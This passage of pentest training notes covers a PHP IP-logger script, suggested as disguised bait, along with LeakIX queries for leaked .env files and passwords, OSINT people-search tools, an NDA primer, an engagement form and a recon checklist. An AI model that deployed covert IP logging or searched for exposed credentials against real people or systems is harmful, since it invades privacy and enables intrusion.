redirection|\n|Illegal Surveillance|Logging IPs without consent can violate privacy laws|\n\n## Example Tools\n\n| Tool                                  | Type                        |\n| ------------------------------------- | --------------------------- |\n| [Grabify](https://grabify.link/)      | Link shortener + IP logger  |\n| [IPLogger.org](https://iplogger.org/) | Image-based and URL loggers |\n| Custom PHP script                     | Fully manual logging setup  |\n\n## Ethical Use Warning\n\nLogging someone's IP without **notice or consent** may violate:\n\n- **GDPR** (EU)\n- **CCPA** (California)\n- **Cybercrime laws** (depending on jurisdiction)\n\nAlways use IP loggers **with permission or in legal environments** like:\n\n- Your own website/server\n- Pen-testing labs\n- CTFs or red-team exercises\n\n---\n## IP Logger (PHP)\n\nip-logger.php\n\n```bash\nvim ip-logger.php\n```\n\n```php\n<?php\n\ndate_default_timezone_set('Asia/Kolkata');\n\nfunction getRealIpAddr() {\n    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {\n        return $_SERVER['HTTP_CLIENT_IP'];\n    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];\n    } else {\n        return $_SERVER['REMOTE_ADDR'];\n    }\n}\n\n$realIp = getRealIpAddr();\n$remoteIp = $_SERVER['REMOTE_ADDR'];\n$uri = $_SERVER['REQUEST_URI'] ?? 'Unknown';\n$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct Access / Unknown';\n$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';\n$dateTime = date('Y-m-d H:i:s');\n\n$logEntry = <<<LOG\n<hr>\n<b>Date:</b> $dateTime<br>\n<b>IP (REMOTE_ADDR):</b> $remoteIp<br>\n<b>IP (Detected):</b> $realIp<br>\n<b>Page:</b> $uri<br>\n<b>Referrer:</b> $referrer<br>\n<b>User-Agent:</b> $userAgent<br>\nLOG;\n\nfile_put_contents(\"log.html\", $logEntry . PHP_EOL, FILE_APPEND | LOCK_EX);\n?>\n```\n\n---\n## Output Log: log.html\n\nLogs will be written to `log.html` in this format:\n\nlog.html\n\n```html\n<hr>\n<b>Date:</b> 2025-07-03 12:45:22<br>\n<b>IP (REMOTE_ADDR):</b> 192.168.1.100<br>\n<b>IP (Detected):</b> 192.168.1.100<br>\n<b>Page:</b> /ip-logger.php<br>\n<b>Referrer:</b> https://example.com<br>\n<b>User-Agent:</b> Mozilla/5.0 (Windows NT 10.0; Win64; x64)...\n```\n\n---\n\n## Recommended: Protect the Log File\n\n.htaccess\n\n```apache\n<Files \"log.html\">\n    Order Allow,Deny\n    Deny from all\n</Files>\n```\n\n---\n\n## Notes\n\n- For **red teaming** or **lab use only**\n- Be careful with **user privacy** - logging IPs without consent may violate laws\n- You can embed this in a webpage disguised as any file or shortener for bait (only in legal/controlled environments)\n\n---\n---"}, {"name": "leaks", "content": "#  LeakIX Recon\n\nLeakIX is an open-source intelligence (OSINT) engine for discovering exposed services, credentials, and data leaks across the internet.\n[Visit LeakIX](https://leakix.net)\n\n#### What Is LeakIX?\n\nLeakIX is similar to Shodan or Censys but focuses more on:\n- Exposed credentials\n- Open directories\n- Misconfigured applications\n- Leaky databases\n- Files with secrets (env, config, backup, etc.)\n\n#### Key Features\n\n| Feature                | Description                                         |\n|------------------------|-----------------------------------------------------|\n| **Full-text Search**   | Search by IP, domain, keywords, banners             |\n| **Leak Detection**     | Finds `.env`, `.git`, backups, admin panels, etc.   |\n| **Database Leak Reports** | MongoDB, Elasticsearch, Redis, etc.             |\n| **Fingerprinting**     | Shows services (HTTP, SSH, DB) and software versions|\n| **Public & Private Scans** | Anonymous search + authenticated deeper scan  |\n\n#### Basic Usage\n\n- Go to: [LeakIX](https://leakix.net)\n- Use the search bar to query:\n\n**Examples:**\n\n- `.env`\n- `index of /backup`\n- `mysql password`\n- `site:.gov`\n- `product:elasticsearch`\n\n#### Common Search Queries\n\n| Query                   | Purpose                                |\n| ----------------------- | -------------------------------------- |\n| `.env`                  | Find leaked environment variables      |\n| `site:*.gov`            | Filter to government sites             |\n| `product:elasticsearch` | Find exposed databases                 |\n| `index of /backup`      | Open directory listing backup files    |\n| `password`              | Search for passwords in HTTP responses |\n| `config.json`           | Look for config file exposures         |\n| `mongo / redis`         | Unsecured databases                    |\n### Examples\n\n- `.env AND password`\n- `product:elasticsearch country:IN`\n- `site:*.edu filetype:bak`\n\n### Authenticated Scanning (Optional)\n\nYou can register and get access to:\n- API access (in beta)\n- Submit your own scans\n- Monitor exposure over time\n\n### Legal Reminder\n\nAlways ensure you have authorization before investigating or testing any system. LeakIX is meant for defensive and research purposes only.\n\n----\n----"}, {"name": "nda", "content": "# NDA in Penetration Testing\n***\nIn penetration testing (pentest), an NDA (Non-Disclosure Agreement) is a **legal contract** signed between the **client** and the **penetration tester or security company** to protect sensitive information.\n\n## What is an NDA in Pentesting?\n***\nAn **NDA** ensures that:\n*   All **confidential information** shared or discovered during the engagement remains **private**.\n*   The tester does **not disclose, reuse, or share** any protected information.\n*   The client can safely disclose **internal systems, network architecture, credentials, etc.**\n\n## Key Components of a Pentesting NDA\n***\n\n| Section | Description |\n| :--- | :--- |\n| **Definition of Confidential Info** | Specifies what is considered confidential (e.g., IP addresses, credentials). |\n| **Obligations of the Tester** | Tester must protect and not disclose any confidential information. |\n| **Exclusions** | What is **not** confidential (e.g., public data, prior known info). |\n| **Term/Duration** | How long the NDA is valid (e.g., 1–5 years after testing ends). |\n| **Permitted Disclosures** | Allows sharing with authorized personnel under certain conditions. |\n| **Return or Destruction of Info** | Tester must return or destroy data post-engagement. |\n| **Legal Remedies** | Penalties if the NDA is breached. |\n\n---\n### Note:  Digital Signatures for Contracts\n\nFor international or remote contracts, digital signature platforms are commonly used to legally sign documents like NDAs. Websites such as **[DocuSign](https://www.docusign.com/en-in)** and other similar services provide a secure and verifiable way to execute agreements between parties regardless of their physical location.\n\n## Why NDAs Matter in Pentests\n***\n*   ✅ **Builds trust** between tester and client.\n*   🔒 **Protects client data** and internal infrastructure details.\n*   📜 **Ensures legal compliance**, especially in regulated industries (e.g., finance, healthcare).\n*   📋 **Clarifies scope rules** and confidentiality boundaries.\n\n## Who Signs It?\n***\n*   **Client's representative** (e.g., CISO, IT Manager)\n*   **Penetration tester or firm's authorized signatory**\n*   Any **subcontractors** involved (if applicable)\n\n## When is the NDA Signed?\n***\nThe NDA is signed **before**:\n*   Any information is shared.\n*   Rules of engagement (RoE) are discussed.\n*   Statement of Work (SoW) is finalized.\n\n## Summary\n***\nAn NDA in a pentest engagement is a **foundational legal safeguard**. It allows open communication between parties while ensuring that **confidential information remains protected** before, during, and after the test.\n\n---\n---"}, {"name": "osint resources", "content": "# 🕵️ People Search & OSINT Resources\n***\nThis section includes tools commonly used in Open Source Intelligence (OSINT) investigations for locating information about individuals, domains, images, infrastructure, and online presence.\n\n### 🔍 General People Search Engines\n***\n*   [Pipl⇗](https://pipl.com/)\n\tUS people searching website.\n\tDeep web search engine for finding individuals using names, emails, usernames, or phone numbers.\n    **Use Case:** Uncover online aliases, social media, and public records across the internet.\n\n*   [ZabaSearch⇗](https://www.zabasearch.com/)\n    U.S.-based people search engine focused on public records such as addresses and phone numbers.\n    **Use Case:** Quickly gather background info like phone numbers, age, and addresses.\n\n### 🖼️ Reverse Image Search\n***\n*   [TinEye⇗](https://tineye.com/)\n    Image recognition search tool that can trace the origin and versions of an image across the web.\n    **Use Case:** Identify fake profiles, monitor image reuse, or find the original source of an image.\n\n### 🌐 Global & Regional Search Engines\n***\n*   [Search Engine Colossus⇗](http://www.searchenginecolossus.com/)\n    A curated list of country-specific search engines from around the world.\n    **Use Case:** Perform localized OSINT searches or access restricted/regional results.\n\n### 🛰️ Satellite & Aerial Imagery\n***\n*   [TerraServer⇗](https://www.terraserver.com/)\n    Offers aerial and satellite imagery primarily for U.S. locations, including historical views.\n    **Use Case:** Infrastructure mapping, terrain analysis, and visual validation of locations.\n- Weather forcaste\n  https://zoom.earth/\n### 🧩 Domain & Hosting Intelligence\n***\n*   [Netcraft⇗](https://www.netcraft.com/)\n    Provides tools for web hosting analysis, phishing detection, SSL certificate data, and DNS info.\n    **Use Case:** Enumerate web servers, identify technologies used, or detect hosting patterns.\n*   [Netcraft Site Report Tool⇗](https://sitereport.netcraft.com/)\n    Investigate specific domain details including IP, hosting provider, and server configuration.\n    **Use Case:** Technical reconnaissance of a target domain.\n*   [Netcraft Report for Armour InfoSec⇗](https://sitereport.netcraft.com/?url=armourinfosec.com)\n    Pre-filled report query for the domain: `armourinfosec.com`.\n\n### 🛡️ IP & Threat Intelligence\n***\n*   [VirusTotal IP Lookup - 104.27.180.58⇗](https://www.virustotal.com/gui/ip-address/104.27.180.58/detection)\n    Aggregates security data from antivirus engines and threat intel services about IPs, URLs, and files.\n    **Use Case:** Assess reputation of IPs, check for malware distribution, and examine communications.\n\n### 🧠 Tip: Combine These Tools\n***\nFor more effective OSINT investigations:\n\n▸ Start with [Pipl](https://pipl.com/) or [ZabaSearch](https://www.zabasearch.com/) for identity clues.\n▸ Use [TinEye](https://tineye.com/) to verify profile pictures.\n▸ Pivot to [Netcraft](https://www.netcraft.com/) and [VirusTotal](https://www.virustotal.com/) for infrastructure intel.\n▸ Use [Search Engine Colossus](http://www.searchenginecolossus.com/) for language-specific/localized lookups.\n\n---"}, {"name": "pentesting form", "content": "# Penetration Testing Engagement | Armour Infosec\n\n**Form Description:**\n\nThe scope and purpose of the Penetration Testing Engagement your organization is about to undertake. The engagement is a thorough assessment aimed at evaluating the security posture of your systems, applications, and networks. By simulating real-world attack scenarios, our goal is to identify potential vulnerabilities and provide actionable recommendations for improving your defenses.\n\nOur approach includes a mix of manual and automated testing techniques to ensure a comprehensive evaluation of your environment. The engagement will cover various aspects of your infrastructure, including network security, application integrity, and the effectiveness of internal controls.\n\nWe customize the testing scope to meet your specific objectives, whether you need to comply with regulatory standards, assess new systems before they go live, or ensure that your current defenses can withstand emerging threats. The methodology we use adheres to industry standards and best practices, ensuring that the assessment is thorough and aligned with recognized frameworks.\n\nAfter completing the engagement, you will receive a detailed report that outlines the findings, the potential risks they pose, and prioritized recommendations for remediation. This report will guide your organization in strengthening its security posture and reducing vulnerabilities.\n\n---\n*\\* Indicates required question*\n\n---\n\n### **Section 1**\n\n**1. Company Name \\***\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**2. First Name \\***\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**3. Last Name \\***\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**4. Job Title \\***\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**5. Business Email \\***\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**6. Phone Number \\***\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Next]** Button (Proceeds to the next section of the form)\n- **[Clear form]** Link\n\n---\n### **Section 2: Scope of Engagement**\n\n**Section Description:**\nThe Scope of Engagement section defines the specific areas that will be covered during the penetration testing engagement. This includes identifying the systems, applications, and networks that are in scope for testing, as well as any that are explicitly out of scope. Clearly outlining the scope ensures that the engagement is focused, effective, and aligned with your organization's security objectives.\n\n---\n\n**1. Description of the Penetration Test Scope (e.g., specific applications, network segments, IP ranges, or systems to be tested) \\***\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n**2. Are there any systems, applications, or IP ranges that are out of scope for this test?**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n**3. Application Testing**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] API\n     - [ ] Web\n     - [ ] Web + API\n     - [ ] Web + API + External Network\n     - [ ] Web + External Network\n     - [ ] Web + Mobile\n     - [ ] Web + Mobile + API\n     - [ ] Mobile\n     - [ ] Mobile + API\n     - [ ] OWASP Top 10 for LLMs\n\n**4. Network Testing**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] External Network\n     - [ ] Internal Network\n     - [ ] Internal + External Network\n     - [ ] Internal Network + PCI Segmentation\n     - [ ] Network + PCI Segmentation\n     - [ ] Wireless Network\n\n**5. Cloud Services**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] AWS\n     - [ ] Azure\n     - [ ] GCP\n     - [ ] Cloud Config\n\n**6. Device and IoT Testing**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Desktop\n     - [ ] IoT\n\n**7. Social Engineering and Physical Security**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Phishing\n     - [ ] Physical\n\n**8. Advanced Testing Techniques**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Red Team\n     - [ ] Prompt Injection\n     - [ ] Threat Modeling\n     - [ ] Security Hardening\n\n**9. Other (please specify)**\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n\n---\n### **Section 3: Technology Stack**\n\n**Section Description:**\nThe **Technology Stack** section gathers information about the underlying technologies, systems, and platforms that will be involved in the penetration testing engagement. This helps to tailor the testing approach to the specific configurations and components in use within your environment. Understanding the technology stack ensures that the testing is relevant and effective.\n\n---\n\n**1. Operating Systems**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Linux\n     - [ ] Windows\n     - [ ] macOS\n     - [ ] Other: `_________________`\n\n**2. Applications**\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**3. Frameworks and Languages**\n   - **Type:** Short Answer\n   - **Placeholder:** Your answer\n\n**4. Frontend Technologies**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] HTML/CSS\n     - [ ] JavaScript\n     - [ ] Angular\n     - [ ] React\n     - [ ] Vue.js\n     - [ ] Other: `_________________`\n\n**5. Backend Technologies**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] .NET\n     - [ ] Java/Spring\n     - [ ] PHP/Laravel\n     - [ ] Ruby on Rails\n     - [ ] Node.js\n     - [ ] Python/Django\n     - [ ] Other: `_________________`\n\n**6. DBMS (Database Management Systems)**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Microsoft SQL Server\n     - [ ] Oracle\n     - [ ] MongoDB\n     - [ ] PostgreSQL\n     - [ ] MariaDB\n     - [ ] MySQL\n     - [ ] SQLite\n     - [ ] Redis\n     - [ ] Other: `_________________`\n\n**7. Infrastructure**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Cloud Services (e.g., AWS, Azure)\n     - [ ] Virtualization (e.g., VMware, Hyper-V)\n     - [ ] Containerization (e.g., Docker, Kubernetes)\n     - [ ] Other: `_________________`\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n\n----\n### **Section 4: Testing Objectives**\n\n**Section Description:**\nThe **Testing Objectives** section identifies the primary goals and outcomes your organization aims to achieve through the penetration testing engagement. Clearly defining these objectives helps align the testing process with your organization's security priorities, ensuring that the assessment provides the most value.\n\n---\n\n**1. Primary Objectives of This Penetration Test (check all that apply): \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Identify vulnerabilities in the network/application\n     - [ ] Assess the security posture of new systems/applications\n     - [ ] Meet regulatory or compliance requirements\n     - [ ] Test incident response procedures\n     - [ ] Evaluate the effectiveness of security controls\n     - [ ] Other: `_________________`\n\n**2. Additional Objectives or Specific Concerns (Please provide any additional objectives or specific areas of concern for this test)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n\n----\n### **Section 5: Target Environment**\n\n**Section Description:**\nThe **Target Environment** section provides information about the environment that will be assessed during the penetration test. This includes details on the type of environment and any rate-limiting controls that might affect the testing process. Accurate information about the target environment helps ensure that the penetration test is conducted effectively and with minimal disruption.\n\n---\n\n**1. What type of environment is being targeted? (check all that apply) \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Production\n     - [ ] Staging\n     - [ ] Development (Dev)\n     - [ ] Other: `_________________`\n\n**2. Are any rate-limiting controls present that could impact the performance or effectiveness of the assessment? (e.g., WAF, IP-based restrictions)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n\n---\n### **Section 6: Methodology**\n\n**Section Description:**\nThe **Methodology** section outlines the approach and techniques that will be used during the penetration testing engagement. This section helps define how the test will be conducted, including the types of testing methods and standards that will guide the assessment. Understanding the methodology ensures that the testing is comprehensive and aligns with industry best practices.\n\n---\n\n**1. Penetration Testing Methodology \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] **Black Box Testing:** Testing with no prior knowledge of the internal workings of the target system.\n     - [ ] **White Box Testing:** Testing with full access to the target system's internal workings, including source code, network configurations, etc.\n     - [ ] **Gray Box Testing:** Testing with partial knowledge of the internal workings, typically including access to system documentation, architecture diagrams, or limited access credentials.\n\n**2. Techniques Employed \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] **Manual Testing:** Thorough testing performed by skilled professionals to identify vulnerabilities that automated tools might miss.\n     - [ ] **Automated Testing:** Utilization of automated tools to scan for known vulnerabilities and common misconfigurations.\n     - [ ] **Vulnerability Scanning:** Scanning the system to identify known vulnerabilities using specialized tools.\n\n**3. Adherence to Standards and Frameworks (check all that apply) \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] **OWASP:** Open Web Application Security Project\n     - [ ] **PTES:** Penetration Testing Execution Standard\n     - [ ] **NIST:** National Institute of Standards and Technology Guidelines\n     - [ ] **MITRE ATT&CK:** A knowledge base for tactics and techniques used in cyber attacks\n     - [ ] **PCI-DSS:** Payment Card Industry Data Security Standard\n     - [ ] Other: `_________________`\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n---\n### **Section 7: Credentials and Test Data**\n\n**Section Description:**\nThe **Credentials and Test Data** section collects information related to the credentials and test data needed for the penetration testing engagement. Providing this information ensures that testers have the necessary access to effectively evaluate the target environment and perform comprehensive testing. It also addresses the handling of sensitive data within the environment.\n\n---\n\n**1. Credentials Required for Testing (Please provide details of any credentials needed for accessing systems, applications, or databases. This includes any user accounts, passwords, or API keys.)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n**2. Does the target environment process or store any personally identifiable information (PII), protected health information (PHI), or card-holder data (CHD)?**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Yes\n     - ○ No\n\n**3. If applicable, can you provide credits or test credit cards for pentesters to use when reviewing payment flows?**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Yes\n     - ○ Not applicable\n\n**4. Special Instructions for Handling Data**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n**5. Access Details**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n**6. Access Permissions:**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Admin/root access\n     - [ ] User-level access\n     - [ ] Other: `_________________`\n\n**7. Additional Information on Credit Card Details (if applicable)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n---\n### **Section 8: Timeline and Scheduling**\n\n**Section Description:**\nThe **Timeline and Scheduling** section collects information regarding the timing and duration of the penetration testing engagement. Providing this information helps in planning the test effectively, ensuring that it fits within your organization's schedule and any specific time windows or constraints.\n\n---\n\n**1. Preferred Start Date for the Penetration Test \\***\n   - **Type:** Date\n   - **Format:** dd/mm/yyyy\n\n**2. Preferred End Date for the Penetration Test \\***\n   - **Type:** Date\n   - **Format:** dd/mm/yyyy\n\n**3. Are there any specific time windows for testing (e.g., after business hours)?**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Yes\n     - [ ] No\n\n**4. Any Time Constraints or Considerations (Please provide any additional details about time constraints or scheduling considerations that may affect the testing.)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n---\n### **Section 9: Communication and Reporting**\n\n**Section Description:**\nThe **Communication and Reporting** section gathers information on how communication will be managed during the penetration testing engagement and the preferred format for reporting the results. This ensures that stakeholders are kept informed and receive the findings in a manner that suits their needs.\n\n---\n\n**1. Preferred Communication Channels During Testing (Please select the preferred method(s) for communication during the engagement.) \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Email\n     - [ ] Slack/Teams\n     - [ ] Phone\n     - [ ] Other: `_________________`\n\n**2. Frequency of Progress Updates (Please select how often you would like to receive updates on the progress of the testing.) \\***\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Daily\n     - ○ Weekly\n     - ○ Only in case of critical findings\n     - ○ At the conclusion of testing\n\n**3. Final Report Delivery Preference (Please select your preferred format for receiving the final report.) \\***\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] PDF\n     - [ ] Encrypted Email\n     - [ ] Hard Copy\n     - [ ] Other: `_________________`\n\n**4. Additional Reporting Requirements (Please specify any additional reporting requirements or preferences, such as executive summaries, detailed findings, or remediation recommendations.)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n---\n### **Section 10: Risk and Impact Considerations**\n\n**Section Description:**\nThe **Risk and Impact Considerations** section addresses potential risks and impacts associated with the penetration testing engagement. This includes identifying any known issues that could affect the test and defining preferred methods for handling disruptions, ensuring that the testing process is conducted with minimal risk to your systems and operations.\n\n---\n\n**1. Known Risks or Potential Impacts (Are there any known risks or potential impacts that could affect the penetration testing, such as legacy systems, critical services, or other sensitive components?)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n**2. Preferred Method for Handling Potential Disruptions (In the event of a disruption or significant finding during the test, what is your preferred method for handling it?)**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Immediate notification\n     - [ ] Test termination upon detection of disruption\n     - [ ] Other: `_________________`\n\n**3. Additional Risk Management Considerations (Please provide any additional information or instructions related to risk management during the penetration test.)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n---\n### **Section 11: Legal and Compliance**\n\n**Section Description:**\nThe **Legal and Compliance** section collects information related to legal, regulatory, and compliance requirements that need to be considered during the penetration testing engagement. This ensures that the testing is conducted in accordance with relevant laws and regulations, and that any additional legal agreements or documentation are addressed.\n\n---\n\n**1. Legal, Regulatory, or Compliance Requirements (Please specify any legal, regulatory, or compliance requirements that need to be adhered to during the penetration testing engagement, such as GDPR, HIPAA, or PCI-DSS.)**\n   - **Type:** Checkboxes\n   - **Options:**\n     - [ ] Yes\n     - [ ] No\n\n**2. Additional Legal Agreements or Documents Required (Are there any additional legal agreements or documents required before the penetration test can proceed?)**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Yes\n     - ○ No\n\n**3. Specific Compliance Considerations (Please provide any specific compliance considerations or restrictions that should be taken into account during the test.)**\n   - **Type:** Paragraph\n   - **Placeholder:** Your answer\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Next]** Button\n- **[Clear form]** Link\n\n---\n### **Section 12: Post-Engagement Support**\n\n**Section Description:**\nThe **Post-Engagement Support** section gathers information on the support and consultation needed after the penetration testing engagement. This ensures that any findings and recommendations are thoroughly addressed and that additional assistance is available if required.\n\n---\n\n**1. Post-Engagement Support or Consultation Required (Will you require support or consultation after the penetration test to address the findings and recommendations?)**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Yes\n     - ○ No\n\n**2. Type of Post-Engagement Support Needed (If you require support, please specify the type of assistance you need, such as remediation guidance, follow-up testing, or additional consultation.)**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Remediation Guidance\n     - ○ Follow-Up Testing\n     - ○ Additional Consultation\n     - ○ Other: `_________________`\n\n**3. Preferred Method for Post-Engagement Communication (How would you prefer to communicate for post-engagement support?)**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Email\n     - ○ Phone\n     - ○ Slack/Teams\n     - ○ Other: `_________________`\n\n**4. Would You Like to Schedule a Debrief Session?: (Would you like to schedule a debrief session to review the findings and discuss the next steps?)**\n   - **Type:** Multiple Choice\n   - **Options:**\n     - ○ Yes\n     - ○ No\n\n**5. Preferred Timing for Debrief Session (If you selected 'Yes' for a debrief session, please provide your preferred timing.)**\n   - **Type:** Date\n   - **Format:** dd/mm/yyyy\n\n---\n\n**Navigation:**\n- **[Back]** Button\n- **[Submit]** Button\n- **[Clear form]** Link\n\n---\n---"}, {"name": "reccon checklist", "content": "## 🗺️ Reconnaissance Checklist (Footprinting Phase)\n***\n### 1. 🌐 Website Reconnaissance\n\n#### 🔍 Visit the Target Website\nManually browse the target's public website to extract visible information.\n*   **Employee Details** – Names, positions, contact info, org chart clues.\n*   **Location Details** – Office addresses, facility names, maps.\n*   **Addresses** – Headquarters, branches, or PO boxes.\n*   **Phone Numbers** – Helpdesk, sales, support, direct extensions.\n\n#### 📋 Check Public Files\n*   **sitemap.html** – Usually used for human users; can reveal hidden pages.\n*   **sitemap.xml** – Used by search engines; shows all indexed site links.\n*   **robots.txt** – Indicates directories disallowed for search engines (often valuable content).\n*   Example:\n    ```bash\n    curl https://example.com/robots.txt\n    ```\n\n#### 🕷️ Spidering and Crawling\nUse automated tools to crawl and map the structure of the website.\n*   **Tools:** Burp Suite, OWASP ZAP, HTTrack, Scrapy, wget\n*   **Online:** [https://xml-sitemaps.com](https://xml-sitemaps.com) \n\n#### 💾 Local Mirroring of the Website\n*   Download complete site:\n    ```bash\n    wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://example.com\n    ```\n*   Analyze source code for comments, hardcoded credentials, and links to dev/test environments.\n\n#### 📅 Wayback Machine (Archive.org)\n*   View historical content and deleted pages:\n    *   [https://web.archive.org/web/*/example.com](https://web.archive.org/web/*/example.com) \n\n***\n### 2. 🧱 What the Website is Built With\n***\n*   Identify backend technologies, CMS, frameworks, JavaScript libraries.\n*   Tools:\n    *   [https://builtwith.com](https://builtwith.com) \n    *   [https://wappalyzer.com](https://wappalyzer.com) \n*   Browser extensions for Wappalyzer or BuiltWith\n\n***\n### 3. 🔎 WHOIS Lookup\n***\n#### ✅ Basic WHOIS Lookup\nIdentify domain registrant, creation/expiry dates, registrar, nameservers.\n```bash\nwhois example.com\n```\n\n#### 🔁 Reverse WHOIS\nSearch for all domains registered with same email/organization.\n*   **Tool:** [https://viewdns.info/reversewhois](https://viewdns.info/reversewhois) \n\n#### 🕒 WHOIS History\nReveal past ownership or registrar changes.\n*   **Tool:** [https://whois-history.whoisxmlapi.com](https://whois-history.whoisxmlapi.com) \n\n***\n### 4. 🌐 Domain to IP Resolution\n***\nResolve a domain name to its corresponding IP address.\n```bash\nnslookup example.com\ndig example.com\n```\n\n***\n### 5. 🗺️ IP Geolocation\n***\nMap the IP address to a physical location.\n*   **Tools:**\n    *   [https://ipinfo.io](https://ipinfo.io) \n    *   [https://iplocation.net](https://iplocation.net) \n\n***\n### 6. 🔀 IP Traceroute\n***\nTrack the route packets take to the target.\n```bash\ntraceroute example.com    # Linux/macOS\ntracert example.com       # Windows\n```\n\n***\n### 7. 📜 IP Address History\n***\nView historical IPs used by the domain.\n*   **Tools:**\n    *   [https://securitytrails.com](https://securitytrails.com) \n    *   [https://viewdns.info](https://viewdns.info) \n\n***\n### 8. 🔁 Reverse IP Lookup\n***\nFind all domains hosted on the same server/IP address.\n*   [https://viewdns.info/reverseip/](https://viewdns.info/reverseip/) \n*   [https://hackertarget.com/reverse-ip-lookup/](https://hackertarget.com/reverse-ip-lookup/) \n\n***\n### 9. 📧 Reverse Mail Server Lookup\n***\nIdentify domains using the same mail server.\n*   [https://mxtoolbox.com/](https://mxtoolbox.com/) \n\n***\n### 10. 🔁 Reverse Name Server Lookup\n***\nList all domains using the same name server.\n*   **Tool:** [https://viewdns.info/reversens/](https://viewdns.info/reversens/) \n\n***\n### 11. 🚪 Open Port Scanning\n***\nCheck for open ports and running services.\n```bash\nnmap -Pn -sV -T4 example.com\n```\n*   **Online:** [https://pentest-tools.com](https://pentest-tools.com) \n\n***\n### 12. 🔎 Google Dorking (Google Hacking)\n***\nSearch sensitive data using Google operators.\n*   **Basic:** `site:`, `inurl:`, `intitle:`, `filetype:`\n*   **Advanced:** `cache:`, `link:`, `related:`, `inanchor:`\n*   **DB:** [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database) \n*   Example Dork:\n    ```\n    site:example.com filetype:pdf\n    ```\n\n***\n### 13. 🌐 Shodan Reconnaissance\n***\nSearch for publicly exposed devices and services.\n*   [https://shodan.io](https://shodan.io) \n*   Example:\n    ```\n    shodan search org:\"Target Organization\" port:21\n    ```\n\n***\n### 14. 💻 GitHub Recon\n***\nFind exposed code, credentials, API keys.\n*   [https://github.com/search](https://github.com/search) \n*   **Tools:** `gitrob`, `truffleHog`, `Gitleaks`, `GitDorker`\n\n***\n### 15. 🤖 GPT-Powered Recon\n***\n*   Use LLMs to parse, analyze, and summarize bulk recon data.\n*   Examples:\n    *   Log analysis\n    *   Dork generation\n    *   Email pattern prediction\n\n***\n### 16. 🧩 OSINT Framework\n***\nComprehensive list of OSINT tools.\n*   [https://osintframework.com](https://osintframework.com) \n\n***\n### 17. 👥 People Search Engines\n***\n*   [https://pipl.com](https://pipl.com) \n*   [https://peekyou.com](https://peekyou.com) \n*   [https://zabasearch.com](https://zabasearch.com) \n\n***\n### 18. 📈 IP Logger\n***\nLog 